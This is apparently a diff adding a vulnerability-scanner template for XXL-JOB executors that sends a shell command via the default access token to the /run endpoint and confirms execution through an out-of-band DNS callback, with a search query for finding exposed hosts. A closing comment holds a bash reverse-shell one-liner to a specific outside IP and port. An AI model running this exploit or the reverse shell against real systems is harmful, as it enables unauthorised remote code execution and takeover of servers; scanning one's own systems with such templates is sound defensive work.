@@ -1,0 +1,43 @@
+id: XXL-JOB
+info:
+  name: XXL-JOB
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    # fofa-query: "invalid request, HttpMethod not support" && port="9999"
+http:
+  - raw:
+      - |
+        POST /run HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Content-Length: 376
+        XXL-JOB-ACCESS-TOKEN: default_token
+
+        {"jobId": 1, "executorHandler": "demoJobHandler", "executorParams": "demoJobHandler", "executorBlockStrategy": "COVER_EARLY", "executorTimeout": 0, "logId": 1, "logDateTime": 1586629003729, "glueType": "GLUE_SHELL", "glueSource": "ping {{interactsh-url}}", "glueUpdatetime": "{{to_unix_time("2023-11-06 13:22:10") }}000", "broadcastIndex": 0, "broadcastTotal": 0} 
+ 
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "200"
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "dns"
+      # - type: word
+      #   part: interactsh_protocol 
+      #   words:
+      #     - "http"
+# bash -c 'exec bash -i &>/dev/tcp/39.101.76.53/3333 <&1'
